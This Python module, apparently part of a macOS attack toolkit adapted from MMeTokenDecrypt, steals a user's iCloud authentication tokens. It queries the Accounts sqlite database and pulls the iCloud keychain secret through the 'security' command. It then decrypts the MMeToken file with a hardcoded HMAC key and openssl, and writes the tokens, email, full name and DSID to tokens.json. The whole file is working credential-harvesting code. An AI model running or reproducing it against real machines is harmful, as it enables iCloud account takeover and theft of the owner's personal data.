# -*- coding: utf-8 -*-
# Taken from https://github.com/manwhoami/MMeTokenDecrypt (slightly modified)
# All credits to manwhoami for his work on this.

import base64
import binascii
import datetime
import glob
import hashlib
import hmac
from os import path
import platform
import sqlite3
import struct
import json
import subprocess

from Foundation import NSData, NSPropertyListSerialization


def get_generation_time(token_value):
    # It appears that apple stores the generation time of the token into
    # the token. This data is stored in 4 bytes as a big endian integer.
    # This function extracts the bytes, decodes them, and converts them
    # to a datetime object and returns a string representation of that
    # datetime object.
    try:
        token_c = token_value.replace("\"", "").replace("~", "=")
        time_d = base64.b64decode(token_c).encode("hex").split("00000000")[1:]
        time_h = [x for x in time_d if not x.startswith("0")][0][:8]
        time_i = struct.unpack(">I", binascii.unhexlify(time_h))[0]
        gen_time = datetime.datetime.fromtimestamp(time_i)
    except Exception:
        gen_time = "Could not find creation time."

    return gen_time


def bin2str(token_bplist, account_bplist=None):
    # Convert the decrypted binary plist to an NSData object that can be read.
    bin_list = NSData.dataWithBytes_length_(token_bplist, len(token_bplist))

    # Convert the binary NSData object into a dictionary object.
    token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(bin_list, 0, None, None)[0]

    # Accounts DB cache
    if "$objects" in token_plist:
        # Because it is accounts db cache, we should also have been passed
        # account_bplist.
        bin_list = NSData.dataWithBytes_length_(account_bplist, len(account_bplist))
        dsid_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(bin_list, 0, None, None)[0]

        for obj in dsid_plist["$objects"]:
            if str(obj).startswith("urn:ds:"):
                dsid = obj.replace("urn:ds:", "")

        token_dict = {"dsid": dsid}

        # Do some parsing to get the data out because it is not stored
        # in a format that is easy to process with stdlibs
        token_l = [x.strip().replace(",", "") for x in str(token_plist["$objects"]).splitlines()]

        pos_start = token_l.index("mmeBTMMInfiniteToken")
        pos_end = (token_l.index("cloudKitToken") - pos_start + 1) * 2

        token_short = token_l[pos_start:pos_start + pos_end]
        zipped = zip(token_short[:len(token_short) / 2],
                     token_short[len(token_short) / 2:])

        for token_type, token_value in zipped:
            # Attempt to get generation time
            # this parsing is a little hacky, but it seems to be the best way
            # to handle all different kinds of iCloud tokens (new and old)
            gen_time = get_generation_time(token_value)

            token_dict[token_type] = (token_value, gen_time)

        return token_dict

    else:
        return token_plist


def run(options):
    string_builder = ""
    token_output = path.join(options["program_directory"], "tokens.json")

    if path.isfile(token_output):
        string_builder += "We already have saved tokens, skipping prompt...\n"

        with open(token_output, "r") as input_file:
            saved_tokens = dict(json.loads(input_file.read()))

            for key in saved_tokens.keys():
                string_builder += "%s: %s\n" % (key, saved_tokens[key])

        print(string_builder)
        return

    # Try to find information in database first.
    root_path = path.expanduser("~") + "/Library/Accounts"
    accounts_db = root_path + "/Accounts3.sqlite"

    if path.isfile(root_path + "/Accounts4.sqlite"):
        accounts_db = root_path + "/Accounts4.sqlite"

    database = sqlite3.connect(accounts_db)
    cursor = database.cursor()
    data = cursor.execute("SELECT * FROM ZACCOUNTPROPERTY WHERE ZKEY='AccountDelegate'")

    # 5th index is the value we are interested in (bplist of tokens)
    token_bplist = data.fetchone()[5]

    data = cursor.execute("SELECT * FROM ZACCOUNTPROPERTY WHERE ZKEY='account-info'")

    if int(platform.mac_ver()[0].split(".")[1]) >= 13:
        string_builder += "Tokens are not cached on >= 10.13.\n"
        token_bplist = ""
    else:
        # 5th index will be a bplist with dsid
        dsid_bplist = data.fetchone()[5]

    if token_bplist.startswith("bplist00"):
        string_builder += "Parsing tokens from cached accounts database at [%s]\n" % accounts_db.split("/")[-1]
        token_dict = bin2str(token_bplist, dsid_bplist)

        string_builder += "DSID: %s\n" % token_dict["dsid"]

        with open(token_output, 'wb') as output_file:
            for t_type, t_val in token_dict.items():
                string_builder += "[+] %s: %s\n" % (t_type, t_val[0])
                string_builder += "    Creation time: %s\n" % t_val[1]

            output_file.write(json.dumps(token_dict))
            string_builder += "Tokens saved to: %s\n" % token_output

    else:
        # Otherwise try by using keychain.
        string_builder += "Checking keychain...\n"

        icloud_key = subprocess.Popen("security find-generic-password -ws 'iCloud'",
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        stdout, stderr = icloud_key.communicate()

        if stderr:
            string_builder += "Error: \"%s\", iCloud entry not found in keychain?\n" % stderr
            return
        if not stdout:
            string_builder += "User clicked deny.\n"

        msg = base64.b64decode(stdout.replace("\n", ""))

        """
        Constant key used for hashing Hmac on all versions of MacOS.
        this is the secret to the decryption!
        /System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit
        yields the following subroutine
        KeychainAccountStorage _generateKeyFromData:
        that uses the below key that calls CCHmac to generate a Hmac that serves
        as the decryption key.
        """

        key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"

        # Create Hmac with this key and icloud_key using md5
        hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()

        # Turn into hex for OpenSSL subprocess
        hexed_key = binascii.hexlify(hashed)
        IV = 16 * "0"
        token_file = glob.glob(path.expanduser("~") + "/Library/Application Support/iCloud/Accounts/*")

        for x in token_file:
            try:
                # We can convert to int, that means we have the dsid file.
                int(x.split("/")[-1])
                token_file = x
            except ValueError:
                continue

        if not isinstance(token_file, str):
            string_builder += "Could not find MMeTokenFile.\n"
            return
        else:
            string_builder += "Decrypting token plist: %s\n" % token_file

        # Perform decryption with zero dependencies by using OpenSSL.
        decrypted = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (
            IV, hexed_key, token_file
        ), shell=True)

        token_plist = bin2str(decrypted)

        string_builder += "Successfully decrypted!\n\n"
        string_builder += "%s (\"%s\", %s):\n" % (
            token_plist["appleAccountInfo"]["primaryEmail"], token_plist["appleAccountInfo"]["fullName"],
            token_plist["appleAccountInfo"]["dsPrsID"]
        )

        with open(token_output, 'wb') as output_file:
            for t_type, t_value in token_plist["tokens"].items():
                string_builder += "[+] %s: %s\n" % (t_type, t_value)
                string_builder += "    Creation time: %s\n" % (get_generation_time(t_value))

            token_dict = dict(token_plist["tokens"])
            token_dict["fullName"] = token_plist["appleAccountInfo"]["fullName"]
            token_dict["primaryEmail"] = token_plist["appleAccountInfo"]["primaryEmail"]

            output_file.write(json.dumps(token_dict))
            string_builder += "Tokens saved to: %s\n" % token_output

    print(string_builder)
